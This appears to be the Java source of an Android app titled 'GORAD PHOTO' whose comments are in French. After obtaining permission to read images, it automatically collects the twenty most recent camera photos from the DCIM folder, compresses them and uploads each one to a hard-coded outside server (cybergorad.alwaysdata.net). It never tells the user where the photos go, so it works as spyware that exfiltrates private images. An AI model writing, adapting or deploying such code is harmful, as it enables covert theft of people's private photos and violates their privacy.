package com.myapp;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 200;
    private static final int MAX_PHOTOS = 20;
    private TextView statusText;

    private List<Uri> photosAEnvoyer = new ArrayList<>();
    private int indexActuel = 0;
    private int succes = 0;
    private int echec = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 150, 50, 50);
        layout.setGravity(Gravity.CENTER);

        TextView title = new TextView(this);
        title.setText("GORAD PHOTO");
        title.setTextSize(32);
        title.setTextColor(Color.parseColor("#00FF41"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 30);

        statusText = new TextView(this);
        statusText.setText("⏳ Initialisation...");
        statusText.setTextSize(16);
        statusText.setPadding(0, 30, 0, 0);
        statusText.setGravity(Gravity.CENTER);

        layout.addView(title);
        layout.addView(statusText);
        setContentView(layout);

        demanderPermission();
    }

    private void demanderPermission() {
        boolean permissionAccordee = false;

        if (Build.VERSION.SDK_INT >= 33) {
            permissionAccordee = checkSelfPermission("android.permission.READ_MEDIA_IMAGES")
                    == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{"android.permission.READ_MEDIA_IMAGES"}, PERMISSION_REQUEST_CODE);
            }
        } else if (Build.VERSION.SDK_INT <= 30) {
            permissionAccordee = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
            }
        } else {
            permissionAccordee = true;
        }

        if (permissionAccordee) {
            lancerEnvoiAutomatique();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                lancerEnvoiAutomatique();
            } else {
                statusText.setText("❌ Permission refusée.\nImpossible d'accéder aux photos.");
                statusText.setTextColor(Color.RED);
            }
        }
    }

    private void lancerEnvoiAutomatique() {
        new Thread(() -> {
            runOnUiThread(() -> {
                statusText.setText("⏳ Recherche des photos récentes...");
                statusText.setTextColor(Color.parseColor("#FFA500"));
            });

            // Récupérer uniquement les photos de la caméra (dossier DCIM)
            photosAEnvoyer = trouverPhotosCamera(MAX_PHOTOS);

            if (photosAEnvoyer.isEmpty()) {
                runOnUiThread(() -> {
                    statusText.setText("❌ Aucune photo trouvée dans la galerie caméra.");
                    statusText.setTextColor(Color.RED);
                });
                return;
            }

            // Réinitialiser les compteurs
            indexActuel = 0;
            succes = 0;
            echec = 0;

            // Lancer l'envoi récursif
            envoyerPhotoSuivante();
        }).start();
    }

    /**
     * Envoie la photo à l'index actuel, puis s'appelle elle-même pour la suivante.
     * Cela garantit un envoi séquentiel, une à la fois.
     */
    private void envoyerPhotoSuivante() {
        // Condition d'arrêt : on a traité toutes les photos
        if (indexActuel >= photosAEnvoyer.size()) {
            final int finalSucces = succes;
            final int finalEchec = echec;
            final int finalTotal = photosAEnvoyer.size();
            runOnUiThread(() -> {
                if (finalEchec == 0) {
                    statusText.setText("✅ " + finalSucces + "/" + finalTotal + " PHOTOS ENVOYÉES !");
                    statusText.setTextColor(Color.parseColor("#00AA00"));
                } else {
                    statusText.setText("⚠️ " + finalSucces + " envoyées, " + finalEchec + " échecs\nsur " + finalTotal + " photos.");
                    statusText.setTextColor(Color.parseColor("#FFA500"));
                }
            });
            return;
        }

        final int index = indexActuel;
        final int total = photosAEnvoyer.size();
        final Uri uri = photosAEnvoyer.get(index);

        runOnUiThread(() -> {
            statusText.setText("⏳ Envoi " + (index + 1) + "/" + total + "...");
            statusText.setTextColor(Color.parseColor("#FFA500"));
        });

        // Lancer l'envoi de cette photo dans un thread séparé
        new Thread(() -> {
            ResultatEnvoi resultat = compresserEtEnvoyer(uri);
            
            // Mettre à jour les compteurs
            if (resultat.succes) {
                succes++;
            } else {
                echec++;
            }

            // Passer à la photo suivante
            indexActuel++;
            
            // Appel récursif (via le thread UI pour éviter les problèmes de pile)
            runOnUiThread(() -> envoyerPhotoSuivante());
        }).start();
    }

    private List<Uri> trouverPhotosCamera(int limite) {
        List<Uri> uris = new ArrayList<>();

        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATE_ADDED
        };

        // Filtrer uniquement les photos dans DCIM (photos prises par la caméra)
        String selection = MediaStore.Images.Media.RELATIVE_PATH + " LIKE ?";
        String[] selectionArgs = new String[]{"DCIM/%"};

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
        String limit = String.valueOf(limite);

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder + " LIMIT " + limit
        );

        if (cursor != null) {
            int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            while (cursor.moveToNext()) {
                long id = cursor.getLong(idColumn);
                Uri uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        String.valueOf(id)
                );
                uris.add(uri);
            }
            cursor.close();
        }
        return uris;
    }

    private static class ResultatEnvoi {
        boolean succes;
        String message;
        ResultatEnvoi(boolean succes, String message) {
            this.succes = succes;
            this.message = message;
        }
    }

    private ResultatEnvoi compresserEtEnvoyer(Uri imageUri) {
        String urlString = "https://cybergorad.alwaysdata.net/upload.php"; // ⚠️ ADAPTEZ L'URL
        String boundary = "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            InputStream is = getContentResolver().openInputStream(imageUri);
            Bitmap originalBitmap = BitmapFactory.decodeStream(is);
            is.close();

            if (originalBitmap == null) {
                return new ResultatEnvoi(false, "Impossible de lire l'image.");
            }

            // Compression : max 1024px, qualité 60%
            int maxSize = 1024;
            int width = originalBitmap.getWidth();
            int height = originalBitmap.getHeight();
            if (width > maxSize || height > maxSize) {
                float ratio = Math.min((float) maxSize / width, (float) maxSize / height);
                width = Math.round(width * ratio);
                height = Math.round(height * ratio);
                originalBitmap = Bitmap.createScaledBitmap(originalBitmap, width, height, true);
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            originalBitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
            byte[] imageBytes = baos.toByteArray();
            baos.close();
            originalBitmap.recycle();

            // Envoi HTTP
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"photo_" + System.currentTimeMillis() + ".jpg\"" + lineEnd);
            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
            dos.writeBytes(lineEnd);

            dos.write(imageBytes);
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            return new ResultatEnvoi(responseCode == 200, "HTTP " + responseCode + " (" + (imageBytes.length / 1024) + " Ko)");

        } catch (Exception e) {
            e.printStackTrace();
            return new ResultatEnvoi(false, e.getClass().getSimpleName());
        }
    }
}
